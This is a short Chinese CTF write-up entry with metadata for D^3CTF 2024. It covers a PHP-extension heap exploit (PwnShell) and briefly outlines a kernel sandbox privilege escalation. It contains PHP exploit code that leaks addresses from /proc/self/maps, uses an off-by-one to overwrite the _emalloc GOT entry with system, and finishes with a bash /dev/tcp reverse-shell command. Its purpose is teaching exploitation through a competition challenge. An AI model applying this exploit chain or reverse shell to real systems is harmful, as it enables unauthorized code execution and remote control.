---
title: D^3CTF 2024 Writeup
contest: D3CTF
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags: [php-zend-allocator, pwn-shell, off-by-one, tcache-double-free, kernelland, protosand]
attack_chain:
  - /proc/self/maps 泄 libc base
  - PHP Zend off-by-one 改 node->buf
  - 任意地址读写劫持 _emalloc GOT
  - 改 system
  - bash -c reverse shell
  - 写 bash shell 写 mount 提权
key_payload: /proc/self/maps + PHP Zend 堆 off-by-one
one_liner: D^3CTF 2024 PwnShell PHP 扩展 + Kernel Sandbox 两道 Pwn。
lesson: PHP 扩展 off-by-one + Zend 分配器 + tcache double-free 经典利用。
quality: high
---

D^3CTF 2024 Writeup 集合（来源 ctfiot）。本文档主要为 PwnShell 复现 + Kernel Sandbox。

**PwnShell (PHP 扩展 Pwn)**

```php
<?php
$libc = ""; $stack = ""; $libvuln = "";
function s2i($s) { /* ... 字节 → int ... */ }
function i2s($i, $x=8) { /* ... int → 字节 ... */ }
function callback($buffer) {
    global $libc, $stack, $libvuln;
    preg_match_all('/([0-9a-f]+)-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/', $buffer, $libc);
    preg_match_all('/([0-9a-f]+)-[0-9a-f]+ .*  \[stack\]/', $buffer, $stack);
    preg_match_all('/([0-9a-f]+)-[0-9a-f]+ .*vuln.so/', $buffer, $libvuln);
}
ob_start("callback");
include("/proc/self/maps");  // 触发 PHP 输出 → callback
$buffer = ob_get_contents();
ob_end_flush();

$libc_base = hexdec($libc[1][0]);
$libvuln = hexdec($libvuln[1][0]);

// 触发 addHacker 越界 + 任意地址读写
addHacker("aaaa...63", "bbbb...47");
addHacker("cccc...63", "dddd...47");
addHacker("eeee...127", "ffff...47");
removeHacker(1);
addHacker("aaaa...63", "bbbb...48");  // off-by-one
editHacker(2, "ccc...\xe0");  // 任意地址写
// 改 _emalloc_got 为 system
editHacker(3, "bash -c 'sh >& /dev/tcp/.../... 0>&1'");
```

**Kernel Sandbox 提权**

KASLR + SMEP + SMAP 全开。KPTI bypass + iretq 回用户态；改 task->fs 提权挂载；写 bash shell 写 mount 文件。

整篇适合作为"现代 PHP 扩展 Pwn + 内核提权"的混合教学案例。
